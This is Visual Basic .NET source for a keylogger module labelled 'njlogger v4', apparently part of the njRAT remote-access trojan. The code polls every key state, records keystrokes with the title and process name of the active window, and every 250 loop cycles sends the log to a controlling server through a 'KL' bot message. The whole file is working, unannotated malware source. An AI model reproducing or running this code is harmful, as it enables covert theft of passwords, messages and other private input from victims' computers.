Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class KLG

    ' njlogger v4
#Region "API"
    <DllImport("user32.dll")>
    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger,
      ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")>
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
#End Region
    Private LastAV As Integer ' Last Active Window Handle
    Private LastAS As String ' Last Active Window Title
    Private lastKey As Keys = Nothing ' Last Pressed Key

    Private Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Object = Process.GetProcessById(id)
            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
            Else

                LastAV = o.ToInt32
                LastAS = p.MainWindowTitle
                Return vbNewLine & "[ " & HM() & " " & p.ProcessName & " " & LastAS & " ]" & vbNewLine
            End If
        Catch ex As Exception
        End Try
        Return ""
    End Function
    Public Clock As New Microsoft.VisualBasic.Devices.Clock
    Private Function HM() As String
        Try
            Return Clock.LocalTime.ToString("yy/MM/dd")
        Catch ex As Exception
            Return "??/??/??"
        End Try
    End Function
    Public Logs As String = ""
    Dim keyboard As Object = New Microsoft.VisualBasic.Devices.Keyboard
    Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0),
             HKL)
            Return sbString.ToString()
        Catch ex As Exception
        End Try
        Return CType(VKCode, Keys).ToString
    End Function
    Private Function Fix(ByVal k As Keys) As String
        Dim isuper As Boolean = keyboard.ShiftKeyDown
        If keyboard.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                    Return "[" & k.ToString & "]"
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Return
                    If Logs.EndsWith("[ENTER]" & vbNewLine) Then
                        Return ""
                    End If
                    Return "[ENTER]" & vbNewLine
                Case Keys.Tab
                    Return "[TAP]" & vbNewLine
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function


    Public Sub WRK()

        Try
            Dim lp As Integer = 0
            While Main.Alive = True
                lp += 1
                For i As Integer = 0 To 255
                    If GetAsyncKeyState(i) = -32767 Then
                        Dim k As Keys = i
                        Dim s = Fix(k)
                        If s.Length > 0 Then
                            Logs &= AV()
                            Logs &= s
                        End If
                        lastKey = k
                    End If
                Next
                If lp = 250 Then
                    lp = 0
                    Main.Send("KL" + Main.SPL + Main.BOT + Main.SPL + Logs)
                    Logs = Nothing
                End If
                Threading.Thread.CurrentThread.Sleep(1)

            End While
        Catch ex As Exception

        End Try


    End Sub
End Class
